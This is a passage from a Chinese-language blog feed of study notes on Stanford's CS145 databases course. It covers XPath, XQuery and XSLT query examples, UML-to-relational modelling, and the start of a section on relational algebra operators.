XPath</h2><p>视频中关于XPath的语法都能在这里找到：<a href="https://www.runoob.com/xpath/xpath-tutorial.html">XPath 教程 | 菜鸟教程 (runoob.com)</a></p><p>主要列举一些示例方便快速复习：</p><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 谓语(Predicates)：将用于查找某些特定节点的条件嵌入到方括号[]中，将其称之为谓语</span><br><span class="line">// 查询价格小于<span class="number">90</span>且存在作者的姓是Ullman的一本书</span><br><span class="line">// 注意：[]中的条件只针对存在<span class="built_in"></span></span><br><span class="line"><span class="built_in">doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)/Bookstore/Book[@Price &lt; <span class="number">90</span> <span class="keyword">and</span></span><br><span class="line">    Authors/Author/Last_Name =<span class="string">&quot;Ullman&quot;</span> ]/Title  </span><br></pre></td></tr></table></figure><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 内置函数(Built-in Functions)</span><br><span class="line">// 查询Remark属性中包含<span class="string">&quot;great&quot;</span>的书<span class="built_in"></span></span><br><span class="line"><span class="built_in">doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)//Book<span class="built_in">[contains</span>(Remark, <span class="string">&quot;great&quot;</span> )]/Title</span><br></pre></td></tr></table></figure><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// self join<span class="built_in"></span></span><br><span class="line"><span class="built_in">doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)//Magazine[Title = </span><br><span class="line">   <span class="built_in"> doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)//Book/Title]</span><br></pre></td></tr></table></figure><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// axes(轴)</span><br><span class="line">// 查询所有父节点不为Bookstore和不为Book的节点<span class="built_in"></span></span><br><span class="line"><span class="built_in">doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)/Bookstore//*<span class="built_in">[name</span>(<span class="literal">parent::</span>*)!=<span class="string">&quot;Bookstore&quot;</span></span><br><span class="line">    <span class="keyword">and</span><span class="built_in"> name</span>(<span class="literal">parent::</span>*)!=<span class="string">&quot;Book&quot;</span>]</span><br><span class="line">// 查询所有跟同层级节点有相同Title的Book或Magzine<span class="built_in"></span></span><br><span class="line"><span class="built_in">doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)/Bookstore/(Book|Magazine)[Title = </span><br><span class="line">    <span class="literal">following-sibling::</span>*/Title <span class="keyword">or</span> Title = <span class="literal">preceding-sibling::</span>*/Title]</span><br></pre></td></tr></table></figure><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于谓语只能表示<span class="string">&quot;存在&quot;</span><span class="built_in">(exists</span>)关系，当我们想表示<span class="string">&quot;任意&quot;</span>(forall)时，需要使用内置函<span class="built_in">数count</span></span><br><span class="line">// 查询所有作者的First_Name都包含<span class="string">&#x27;J&#x27;</span>的书<span class="built_in"></span></span><br><span class="line"><span class="built_in">doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)//Book[</span><br><span class="line">   <span class="built_in"> count</span>(Authors/Author<span class="built_in">[contains</span>(First_Name,<span class="string">&quot;J”)]) = </span></span><br><span class="line"><span class="string">    count(Authors/Author/First_Name)]</span></span><br></pre></td></tr></table></figure><h2 id="2-XQuery"><a href="#2-XQuery" class="headerlink" title="2. XQuery"></a>2. XQuery</h2><p>视频中大多数的语法能在这里找到：<a href="https://www.runoob.com/xquery/xquery-tutorial.html">XQuery 教程 | 菜鸟教程 (runoob.com)</a></p><p>内置函数需要在XPath中查询：<a href="https://www.runoob.com/xpath/xpath-functions.html">XPath、XQuery 以及 XSLT 函数 | 菜鸟教程 (runoob.com)</a></p><p>限定表达式等在上述链接找不到，可以在这里看：<a href="https://learn.microsoft.com/zh-cn/sql/xquery/quantified-expressions-xquery?view=sql-server-ver16">限定表达式 (XQuery) - SQL Server | Microsoft Learn</a></p><h3 id="2-1-FLWOR表达式"><a href="#2-1-FLWOR表达式" class="headerlink" title="2.1 FLWOR表达式"></a>2.1 FLWOR表达式</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">For <span class="variable">$var</span> <span class="keyword">in</span> expr</span><br><span class="line">Let <span class="variable">$var</span> := expr</span><br><span class="line">Where condition</span><br><span class="line">Order <span class="keyword">by</span> expr</span><br><span class="line">Return expr</span><br></pre></td></tr></table></figure><h3 id="2-2-代码示例"><a href="#2-2-代码示例" class="headerlink" title="2.2 代码示例"></a>2.2 代码示例</h3><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 查询价格小于<span class="number">90</span>且存在作者的姓是Ullman的一本书</span><br><span class="line"><span class="keyword">for</span> <span class="variable">$b</span> <span class="keyword">in</span><span class="built_in"> doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)/Bookstore/Book</span><br><span class="line"><span class="keyword">where</span> <span class="variable">$b</span>/@Price &lt; <span class="number">90</span> </span><br><span class="line"> <span class="keyword">and</span> <span class="variable">$b</span>/Authors/Author/Last_Name = <span class="string">&quot;Ullman&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$b</span>/Title</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">$b</span> <span class="keyword">in</span><span class="built_in"> doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)/Bookstore/Book</span><br><span class="line"></span><br><span class="line">// 限定表达式 ( <span class="keyword">some</span> | <span class="keyword">every</span> ) <span class="language-xml"><span class="tag">&lt;<span class="name">variable</span>&gt;</span> in </span><span class="language-xml"><span class="tag">&lt;<span class="name">Expression</span>&gt;</span> (,...) satisfies </span><span class="language-xml"><span class="tag">&lt;<span class="name">Expression</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">// some表示&quot;存在&quot;  every表示&quot;任意&quot;</span></span><br><span class="line"><span class="language-xml">// 查询Title中存在作者的First_Name的Book</span></span><br><span class="line"><span class="language-xml">where some $fn in $b/Authors/Author/First_Name satisfies</span></span><br><span class="line"><span class="language-xml">    contains($b/Title, $fn)</span></span><br><span class="line"><span class="language-xml">    </span></span><br><span class="line"><span class="language-xml">// 构造返回结果    </span></span><br><span class="line"><span class="language-xml">return </span><span class="language-xml"><span class="tag">&lt;<span class="name">Book</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        </span><span class="language-xquery">&#123; <span class="variable">$b</span>/Title &#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="language-xquery">&#123; <span class="variable">$b</span>/Authors/Author/First_Name &#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Book</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 聚合函数</span><br><span class="line">// 查询所有Book的Price的平均值</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Average</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xquery">&#123; <span class="keyword">let</span> <span class="variable">$plist</span> :=<span class="built_in"> doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)/Bookstore/Book/@Price</span></span><br><span class="line"><span class="language-xquery">    <span class="keyword">return</span><span class="built_in"> avg</span>(<span class="variable">$plist</span>)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">Average</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">$b</span> <span class="keyword">in</span><span class="built_in"> doc</span>(<span class="string">&quot;BookstoreQ.xml&quot;</span>)/Bookstore/Book</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="variable">$b</span>/@Price</span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Book</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">         </span><span class="language-xquery">&#123; <span class="variable">$b</span>/Title &#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">         </span><span class="language-xml"><span class="tag">&lt;<span class="name">Price</span>&gt;</span></span><span class="language-xquery">&#123; <span class="variable">$b</span>/data(@Price))&lt;/Price&gt;</span></span><br><span class="line"><span class="language-xquery">       &lt;/Book&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 过滤重复值</span><br><span class="line">//<span class="built_in"> distinct-values</span>返回 值的列表，而不是 节点的列表</span><br><span class="line"><span class="keyword">for</span> <span class="variable">$n</span> <span class="keyword">in</span><span class="built_in"> distinct-values</span><span class="built_in">(doc</span>(<span class="string">&quot;Bookstore0.xml&quot;</span> )//Last_Name)</span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Last_Name</span>&gt;</span> </span><span class="language-xquery">&#123;<span class="variable">$n</span>&#125;</span><span class="language-xml"> <span class="tag">&lt;/<span class="name">Last_Name</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="3-XSLT-EXtensible-Stylesheet-Language"><a href="#3-XSLT-EXtensible-Stylesheet-Language" class="headerlink" title="3. XSLT(EXtensible Stylesheet Language)"></a>3. XSLT(EXtensible Stylesheet Language)</h2><p>XSLT支持将XML转换为其他文档，比如XHTML。对XML的转换也可以看作是查询和构造结果</p><p>示例如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">xmins:xsl</span>=<span class="string">&quot;http://mmr.w3.org/1999/XSl/Transform&quot;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;xml&quot;</span> <span class="attr">indent</span>=<span class="string">&quot;yes&quot;</span> <span class="attr">onit-xml-declaration-</span>&quot;<span class="attr">yes</span>&quot; /&gt;</span></span><br><span class="line">//外层是基本格式</span><br><span class="line"></span><br><span class="line">// template + match匹配特定节点</span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;Book&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BookTitle</span>&gt;</span></span><br><span class="line">    // 选择特定节点中的子节点并构造返回结果</span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;Title&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">BookTitle</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;Magazine&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">MagazineTitle</span>&gt;</span> <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;Title&quot;</span> /&gt;</span> <span class="tag">&lt;/<span class="name">MagazineTitle</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 不等号需要使用转义 小于号：$lt;  大于号$gt;</span><br><span class="line">// copy-of + select返回选择到的节点</span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;Book[@Price <span class="symbol">&amp;lt;</span> 90]&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;.&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 不满足所有匹配的节点和属性会成串返回，因此得作以下处理</span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;text()&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">// 更加具体的限定条件所构造的匹配，优先度更高</span><br><span class="line">// 当节点同时满足两个优先度相同的匹配规则时（最好不要，会报错），以最后一个匹配规则为结果</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// apply-templates + select 将 template + select 的结果嵌入其中</span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;*|@*|text()&quot;</span></span></span><br><span class="line"><span class="tag">    &lt;<span class="attr">xsl:copy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:apply-templates</span> <span class="attr">select</span>=<span class="string">&quot;*|@*|text()/&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;/xsl:copy&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;/xsl:template&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>My CD Collection<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#9acd32&quot;</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Artist<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Price<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span> </span><br><span class="line">        // for-each + select 遍历选择到的所有节点</span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">&quot;catalog/cd&quot;</span>&gt;</span> </span><br><span class="line">            // if + test 选择满足条件的节点</span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">&quot;price <span class="symbol">&amp;gt;</span> 10&quot;</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;title&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;artist&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;price&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="三、统一建模语言-UML"><a href="#三、统一建模语言-UML" class="headerlink" title="三、统一建模语言(UML)"></a>三、统一建模语言(UML)</h1><p>UML用图形化的表示方法描述对数据模型作建模，可以直接翻译为关系模型</p><h2 id="1-类-Classes"><a href="#1-类-Classes" class="headerlink" title="1. 类(Classes)"></a>1. 类(Classes)</h2><p>关系模型中的每一个表可以描述为一个了类，如</p><p>Student(<u>sID</u>, sName, GPA)</p><p>可以与下述模型互相转换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------+</span><br><span class="line">|  Student  |</span><br><span class="line">+-----------+</span><br><span class="line">|   sID pk  |</span><br><span class="line">|   sName   |</span><br><span class="line">|    GPA    |</span><br><span class="line">+-----------+</span><br><span class="line">| &lt;methods&gt; |     </span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure><h2 id="2-关联-和-关联类-Associations-and-Association-Classes"><a href="#2-关联-和-关联类-Associations-and-Association-Classes" class="headerlink" title="2. 关联 和 关联类(Associations and Association Classes)"></a>2. 关联 和 关联类(Associations and Association Classes)</h2><p>一个类跟另一个类有联系，即有关联，可以有一条线将两个类相连来表示，而关联所产生的附加信息我们可以用一个关联类表示，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-------+               +-------+  </span><br><span class="line">|   C1  |  Association  |   C2  |</span><br><span class="line">+-------+-------+-------+-------+</span><br><span class="line">|   A1  |       |       |   A2  |</span><br><span class="line">+-------+       |       +-------+</span><br><span class="line">                |</span><br><span class="line">             +--+----+ </span><br><span class="line">             |  C3   |</span><br><span class="line">             +-------+</span><br><span class="line">             |  A3   | </span><br><span class="line">             +-------+             </span><br></pre></td></tr></table></figure><p>其中C1和C2关联到对方的数量可能不同，比如一个学生只能选一个专业，记为1..1，一个专业有至少一个学生修读，记为1..*，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+-------+               +-------+  </span><br><span class="line">|   C1  |  Association  |   C2  |</span><br><span class="line">+-------+-------+-------+-------+</span><br><span class="line">|   A1  |1..*   |   1..1|   A2  |</span><br><span class="line">+-------+       |       +-------+</span><br><span class="line">                |</span><br><span class="line">             +--+----+ </span><br><span class="line">             |  C3   |</span><br><span class="line">             +-------+</span><br><span class="line">             |  A3   | </span><br><span class="line">             +-------+             </span><br></pre></td></tr></table></figure><p>实际上，如果对应的数量是0..1或者1..1，那么关联表是多余的，可以将关联的属性归到C1中，如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+-------+               +-------+  </span><br><span class="line">|   C1  |  Association  |   C2  |</span><br><span class="line">+-------+-------+-------+-------+</span><br><span class="line">|   A1  |1..*       1..1|   A2  |</span><br><span class="line">|   A3  |               +-------+</span><br><span class="line">+-------+                                      </span><br></pre></td></tr></table></figure></p><h2 id="3-子类-Subclasses"><a href="#3-子类-Subclasses" class="headerlink" title="3. 子类(Subclasses)"></a>3. 子类(Subclasses)</h2><p>一个父类可以有很多个子类，子类拥有父类的主键和额外的属性或关联，如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">            +------+</span><br><span class="line">            |  C1  |</span><br><span class="line">            +------+</span><br><span class="line">            |  K pk|</span><br><span class="line">            |  A1  |</span><br><span class="line">            +--+---+</span><br><span class="line">               |</span><br><span class="line"> +-------------+------------+</span><br><span class="line"> |             |            |</span><br><span class="line"> |             |            |</span><br><span class="line">+--+--+    +--+--+         +-------+               +-------+  </span><br><span class="line">| C2  |    |  C3 |         |   C4  |  Association  |   C5  |</span><br><span class="line">+-----+    +-----+         +-------+---------------+-------+</span><br><span class="line">| A2  |    |  A3 |         |   A4  |               |   A5  |</span><br><span class="line">+-----+    +-----+         +-------+               +-------+ </span><br></pre></td></tr></table></figure></p><p>不完整/完整(<strong>incomplete</strong>/<strong>complete</strong>)：</p><p>当子类能够表示所有的情况时，我们说这些子类是complete的，否则则是incomplete的</p><p>重叠/不相交 (<strong>overlapping</strong>/<strong>disjoint</strong>)：</p><p>当有对象能够同时属于多个子类时，我们说这些子类是overlapping的，否则则是disjoint的</p><p>将带子类的UML翻译为关系模型有多种办法：</p><ol><li>父类建表，每一个子类就是一个表，只包含子类的属性和父类的主键，适用于disjoint + incomplete的情况</li><li>父类可不建表，每一个子类就是一个表，它不仅包含子类的属性和父类的主键，也包含父类的属性，适用于disjoint + complete的情况</li><li>用一个表包含父类和所有子类的属性：适用于heavily overlapping的情况</li></ol><blockquote><ol><li>Subclass relations contain superclass key+ specialized attrs</li><li>Subclass relations contain all attributes</li><li>One relation containing all superclass + subclass attrs.</li></ol></blockquote><h2 id="4-组合和聚合-Composition-and-Aggregation"><a href="#4-组合和聚合-Composition-and-Aggregation" class="headerlink" title="4. 组合和聚合(Composition and Aggregation)"></a>4. 组合和聚合(Composition and Aggregation)</h2><p>组合和聚合都是关联的特例，强调整体和部分的关系，在转换为关系模型时跟关联没有区别，但是在UML中的描述存在语义上的区别。</p><p>组合中的整体和部分具有强依赖，<strong>整体的对象负责部分的对象的生命周期</strong>，如鸟和翅膀</p><p>而聚合的<strong>整体和部分可以独立存在</strong>，如汽车和轮胎，部门和员工</p><p>详见前言中的参考资料。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> 关系型数据库 </tag>
            
            <tag> XML </tag>
            
            <tag> UML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS145 Intro to databases 学习笔记2——Relational Algebra、SQL</title>
      <link href="/2024/01/27/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%E2%80%94%E2%80%94Relational%20Algebra%E3%80%81SQL/"/>
      <url>/2024/01/27/CS145%20Intro%20to%20databases%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%E2%80%94%E2%80%94Relational%20Algebra%E3%80%81SQL/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是学习<strong>standford CS145 Introduction to Databases</strong>系列视频的第二篇笔记，内容主要包括第五章和第六章查询Relational Model的两种表达形式:</p><ol><li>关系代数(Relational Algebra)</li><li>SQL</li></ol><p>视频链接：<a href="https://www.youtube.com/playlist?list=PLroEs25KGvwzmvIxYHRhoGTz9w8LeXek0">Introduction to Databases - Jennifer Widom - Stanford</a></p><h1 id="一、Relational-Algebra"><a href="#一、Relational-Algebra" class="headerlink" title="一、Relational Algebra"></a>一、Relational Algebra</h1><h2 id="1-基本的运算符"><a href="#1-基本的运算符" class="headerlink" title="1. 基本的运算符"></a>1. 基本的运算符</h2><p>在下述表述中，$E$代表表达式，可以为任意下述符号和关系（也就是表）的组合</p><p>$\Pi_{A_1, A_2, …, A_n} (E)$： <strong>project运算</strong>，$A_1, A_2, …, A_n$为列名，用于<strong>取出特定的几列</strong></p><p>$\sigma_{condition} (E)$：<strong>select运算</strong>，$condition$表示应当满足的条件，用于<strong>筛选特定的几行</strong></p><p>$E_1 \times E_2$：<strong>叉积运算</strong>，<strong>取$E_1$的所有元组和$E_2$的所有元组做组合</strong>，结果行数为两者行数的乘积，列数为两者列数之和</p><p>$E_1 \cup E_2$：<strong>并运算</strong>，为二元运算符，其中，$E_1$和$E_2$应有相同的结构，结果为<strong>两者元组之和去除重复行</strong></p><p>$E_1 - E_2$：<strong>差运算</strong>，为二元运算符，对于其中，$E_1$和$E_2$应有相同的结构，结果为<strong>前者去除重复行</strong></p><p>$\rho_{R(A_1, A_2, …, A_n)} (E) $：<strong>rename运算</strong>，其中$R(A_1, A_2, …, A_n)$代表<strong>某种方法$R$，将$E$中的每一列依次重命名为$A_1, A_2, …, A_n$。</strong></p><h2 id="2-其他常用运算符"><a href="#2-其他常用运算符" class="headerlink" title="2. 其他常用运算符"></a>2. 其他常用运算符</h2><p>以下常用运算符可以由基本的运算符所组合而成，不会增加原有符号体系的表达能力，只是便于书写和更精炼的表达</p><p>$E_1 \bowtie E_2$: <strong>自然连接(natural join)</strong>，相当于<strong>叉积运算后，取相同列名的值相同的元组作为结果</strong>，即</p><blockquote><script type="math/tex; mode=display">E_1 \bowtie E_2 = \Pi_{Shema_1 \cup Shema_2} (\sigma_{E_1.A_1 = E_2.A_1, E_1.A_2 = E_2.A_2,..., E_1.A_n = E_2.A_n} ( E_1 \times E_2))</script></blockquote><p>$E_1 \bowtie_{\theta} E_2$: <strong>$\theta$连接(theta join)</strong>，相当于<strong>叉积运算后，保留满足条件$\theta$的元组作为结果</strong>，即</p><blockquote><script type="math/tex; mode=display">E_1 \bowtie_{\theta} E_2 = \Pi_{Shema_1 \cup Shema_2} (\sigma_{\theta} ( E_1 \times E_2))</script></blockquote><p>$E_1 \cap E_2$：<strong>交运算</strong>，，其中，$E_1$和$E_2$应有相同的结构，结果为<strong>两者元组的所有重复行</strong>，可以由并运算和差运算表达，如下：</p><blockquote><script type="math/tex; 